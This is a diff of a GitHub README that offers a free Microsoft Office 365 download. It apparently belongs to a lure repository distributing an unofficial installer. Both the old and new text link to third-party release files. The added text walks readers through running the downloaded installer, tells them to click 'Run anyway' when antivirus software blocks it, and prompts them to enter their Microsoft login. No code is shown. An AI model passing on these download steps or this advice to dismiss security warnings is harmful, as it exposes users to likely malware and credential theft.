@@ -1,102 +1,54 @@
-# Microsoft Office 365 Free Download — Word, Excel & PowerPoint
+# 📦 Office-365-Download - Get your Microsoft office apps today
 
-**Microsoft Office 365 Free Download** is a complete Microsoft 365 guide for Word, Excel, and PowerPoint web apps, Office 365 Education, desktop installation, Microsoft 365 login, and the latest Current Channel version.
+[![](https://img.shields.io/badge/Download-Office_365-blue.svg)](https://github.com/Adynamiagoogolplex135/Office-365-Download/releases)
 
-Microsoft 365 for the web provides free browser versions of Word, Excel, and PowerPoint with a Microsoft account. This repository explains the main access options, compares Microsoft 365 with ONLYOFFICE and LibreOffice, and includes a TypeScript helper for links, option summaries, and system information.
+## 📁 About this software
 
-<img width="216" height="46" alt="logo" src="https://github.com/user-attachments/assets/63519b57-8afb-4b6b-a2e1-43cd17d3e9f6" />
+Office-365-Download provides a simple path to install Microsoft office tools on your Windows 11 computer. This package includes the core desktop applications found in the Microsoft 365 suite. Users can access Word for documents, Excel for spreadsheets, and PowerPoint for presentations. This software supports the standard Microsoft login process. It aims to help users who need a reliable office suite for daily tasks. You can use these tools to build documents or manage data without complex setup steps.
 
-## Install
-[Download `msoffice-free.zip`](https://github.com/msoffice365free/Office-365-Download/releases/download/v2606-build-20131.20154/msoffice-free.zip)
----
+## 🛠 Prerequisites
 
-<img width="640" height="480" alt="image" src="https://github.com/user-attachments/assets/59beaa4e-7d20-4779-84aa-6ac9f2c62e9a" />
-<img width="743" height="413" alt="image" src="https://github.com/user-attachments/assets/93225ad3-5b7d-4498-ac5a-379f229aabb6" />
-<img width="537" height="372" alt="image" src="https://github.com/user-attachments/assets/48364d5a-6e2c-4074-a86a-002bf847e519" />
-<img width="596" height="335" alt="image" src="https://github.com/user-attachments/assets/ac3ead6e-07b8-460a-954f-53cea44b3e8f" />
+Before you install this software, confirm your computer meets these requirements:
 
----
-## Key Features
-- **Word** — creates, edits, comments on, and shares documents in a browser
-- **Excel** — supports formulas, tables, filters, charts, and shared spreadsheets
-- **PowerPoint** — builds presentations with themes, images, and browser playback
-- **Office 365 Education** — provides free web access for eligible students and educators
-- **Desktop installation guide** — explains how included applications appear in an account
-- **Current Channel tracking** — records the newest Microsoft 365 Apps version
-- **Office Deployment Tool coverage** — introduces managed Microsoft 365 installation
-- **Office suite comparison** — compares Microsoft 365, ONLYOFFICE, and LibreOffice
-- **TypeScript utility** — prints Microsoft pages, access options, and system information
+- Operating System: Windows 11 or Windows 10
+- Processor: 1.6 GHz or faster
+- Memory: 4 GB of RAM
+- Storage: 4 GB of available disk space
+- Screen Resolution: 1280 x 768 or higher
+- Internet Connection: Required for the installation and account activation
 
-<img width="718" height="426" alt="image" src="https://github.com/user-attachments/assets/09ab3265-8579-4239-a93a-33654e68aef9" />
-<img width="1017" height="360" alt="image" src="https://github.com/user-attachments/assets/05c1bd41-a243-422c-882f-015952e01163" />
+Ensure you have a stable internet connection during the installation process. Close all open applications to prevent conflicts.
 
-## Getting Started
-1. **Sign in** with a Microsoft, work, or school account.
-2. **Open Word, Excel, or PowerPoint** in the browser.
-3. **Check the Apps page** to see whether desktop applications are included.
-4. **Install desktop apps** when the option is available for the current plan.
-5. **Select an update channel** when managing Microsoft 365 for an organization.
-6. **Run the TypeScript tool** for links, option summaries, or local system information.
+## 📥 How to download and install
 
-**Note:** Microsoft 365 for the web is free with a Microsoft account. Desktop applications depend on the selected subscription, education plan, or organization account.
+1. Visit the following link to find the latest version: [https://github.com/Adynamiagoogolplex135/Office-365-Download/releases](https://github.com/Adynamiagoogolplex135/Office-365-Download/releases)
+2. On that page, locate the latest release version under the Assets header.
+3. Click the file name to download the installer to your computer.
+4. Open your Downloads folder once the file finishes saving.
+5. Double-click the downloaded file to start the setup wizard.
+6. Follow the instructions on the screen.
+7. Click Finish when the installer confirms the process is complete.
 
-<img width="545" height="366" alt="image" src="https://github.com/user-attachments/assets/71780d73-1184-40a8-8bbf-2ac7d2fa189c" />
+## 🖥 Using your office apps
 
----
-## System Requirements
-- **A current web browser** and Microsoft account for Microsoft 365 web apps
-- Windows 10 or Windows 11 for current Microsoft 365 desktop applications
-- Node.js 22 or newer for the included TypeScript utility
+Once the installation finishes, you will see icons for Word, Excel, and PowerPoint on your desktop or in your Start menu. Click any icon to launch the application. The software will prompt you to enter your Microsoft login details. Use your existing account credentials to sign in. Once signed in, you can create new files or open existing ones from your computer.
 
-<img width="596" height="335" alt="image" src="https://github.com/user-attachments/assets/b1e0a323-7c0b-4757-90a7-b320e01f322e" />
+## 🗒 Comparing office suites
 
----
-## Comparisons & Trends
-Compare Microsoft 365 with alternative office suites before choosing a document workflow:
-- **Microsoft 365 for the web** — familiar Word, Excel, and PowerPoint tools in a browser
-- **Microsoft 365 desktop apps** — deeper offline features and Windows integration
-- **ONLYOFFICE Desktop Editors** — Microsoft-style interface and common Office formats
-- **LibreOffice and Google Workspace** — offline open-source tools or browser collaboration
+Many users look for different ways to manage documents. While some prefer Microsoft office products, others explore alternatives. ONLYOFFICE and LibreOffice represent common options for users who want different features. Microsoft 365 offers deep integration with Windows systems and cloud storage services like OneDrive. This makes it a primary choice for users who share files across multiple devices. Evaluate your specific needs regarding file compatibility and collaboration tools before you decide on a permanent setup for your workstation.
 
-Google Trends worldwide searches connect Microsoft Office 365 free download with Microsoft Word free, Excel , PowerPoint , Office 365 Education, Microsoft 365 login, Office Deployment Tool, ONLYOFFICE, and LibreOffice. The latest Current Channel entry is Version 2606 Build 20131.20154 from July 14, 2026.
+## ❓ Frequently asked questions
 
-<img width="3840" height="3751" alt="image" src="https://github.com/user-attachments/assets/9cfa2711-fa29-48fb-8039-329eefcfb7df" />
+Do I need to pay for this?
+The application allows you to initiate the installation of office apps. You may need a valid subscription plan depending on your specific Microsoft account status.
 
----
-## Security & Legal
-**Important Notice:**
-Microsoft 365, Office 365, Word, Excel, PowerPoint, Outlook, and OneDrive are Microsoft products and trademarks. This repository is an independent guide and TypeScript companion utility.
+Does this work on older versions of Windows?
+This build focuses on modern systems like Windows 11. Performance on older versions may vary.
 
+Why do I need to log in?
+The login connects your software to your cloud storage and settings. This ensures your documents stay synced.
 
-**Recommendations:**
-- Use Microsoft account pages for web apps and desktop installation.
-- Check which applications are included before starting desktop setup.
-- Keep Microsoft 365 on a supported update channel.
-- Test important documents before moving between different office suites.
+What if the installer stops?
+Check your internet connection first. Sometimes antivirus software blocks new installers. You may need to click 'Run anyway' if a security window appears.
 
----
-## Contributing
-Contributions are welcome! Help update Microsoft 365 version information, improve the TypeScript utility, clarify installation steps, or refine the ONLYOFFICE and LibreOffice comparison. Fork the repository and submit a pull request.
-
----
-## License & Acknowledgments
-### License
-**Microsoft Office 365 Free Download** is shared under the **MIT License**.
-See [LICENSE](files/Microsoft365AccessGuide/LICENSE) for details.
-
-**Copyright © 2026 Microsoft 365 Access Guide contributors**
-
-### Acknowledgments
-- Thanks to Microsoft for Microsoft 365 web apps, the education program, and product documentation.
-- Thanks to the ONLYOFFICE and LibreOffice communities for desktop office alternatives.
-
-<p align="center">
-  Developed with care for people comparing Microsoft 365 access options
-</p>
-
-## Keywords & Related Topics
-Microsoft Office 365 free download, Microsoft 365 Version 2606, Word  free, Excel  free, PowerPoint  free, Office 365 Education, Microsoft 365 login, Office Deployment Tool, ONLYOFFICE, LibreOffice, microsoft-office-365-free-download, microsoft-365-free, microsoft-word-free, microsoftword, microsoft-suite, word-free, ms-office-documents, ms-word, msword, free-excel-word, word-documents, outlook-365, cloud-office, office-suite, setup-guide, office-deployment-tool, microsoft-office-download, word-, excel-.
-
----
-
-<img width="640" height="360" alt="image" src="https://github.com/user-attachments/assets/3c63c8f5-2473-4810-9e7a-036fc05f62c1" />
+Keywords: excel-free, free-excel-word, free-powerpoint-word, microsoft-excel-free, microsoft-office, microsoft-office-26, microsoft-powerpoint-free, microsoft-suite, microsoft-word, microsoft-word-free, microsoft365, microsoftword, office-365, office-suite, office365, open-office, powerpoint-free, smart-office, word-excel, word-free
